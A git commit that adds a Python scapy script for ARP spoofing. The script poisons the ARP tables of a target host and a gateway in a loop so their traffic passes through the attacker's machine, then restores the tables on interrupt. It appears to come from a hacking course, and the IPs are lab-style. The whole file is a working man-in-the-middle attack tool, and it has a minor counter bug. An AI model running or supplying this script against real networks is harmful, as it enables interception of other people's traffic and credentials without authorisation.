5d098ab3f8abcab9116d13542177794bb014a273
Faris <fmoha@pixelatedspace.me>
2023-10-11 12:56:06 +0400

    Create arp_spoof.py

---
+++ arp_spoof.py
@@ -0,0 +1,49 @@
+# Date : October 11th 2023
+# Original Author : Zaid Sabih , Zsecurity
+# Edited by : Faris Mohammad 
+# Revision : 1
+# Note : 
+
+# Description : This spoofs the ARP table to route all traffic between Victim and Gateway 
+#               through the Attackers computer.
+#               
+
+import scapy.all as scapy
+import time 
+import sys
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    return answered[0][1].hwsrc
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+target_ip = "10.0.2.7"
+gateway_ip = "10.0.2.1"
+
+try:
+    packet_sent_count=0
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        packets_sent_count = packet_sent_count + 2
+        print("\r[+] Sent " + str(packets_sent_count)),
+        sys.stdout.flush()
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n [-] Detected ctrl+c ... Resetting ARP tables... PLease wait.\n")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
